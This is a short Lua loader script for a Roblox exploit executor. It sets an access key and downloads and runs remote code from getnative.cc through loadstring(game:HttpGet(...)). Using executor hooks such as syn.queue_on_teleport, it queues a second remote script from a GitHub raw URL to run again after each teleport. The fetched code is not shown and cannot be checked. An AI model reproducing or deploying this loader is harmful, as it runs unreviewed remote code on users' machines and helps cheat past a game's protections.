if not game:IsLoaded() then
    print("Waiting to load...")
    game.Loaded:Wait()
end

task.wait(10)

script_key="wFbDSAywfobaCIGkaKixLnibwcJHFbgL";
(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()

local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local Players = game:GetService("Players")

Players.LocalPlayer.OnTeleport:Connect(function(State)
	if queueteleport then
		print("Teleporting...")
		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Levi4Chan/4MyEyesOnly/refs/heads/main/dr.lua'))()")
	end
end)

print("Loaded.")
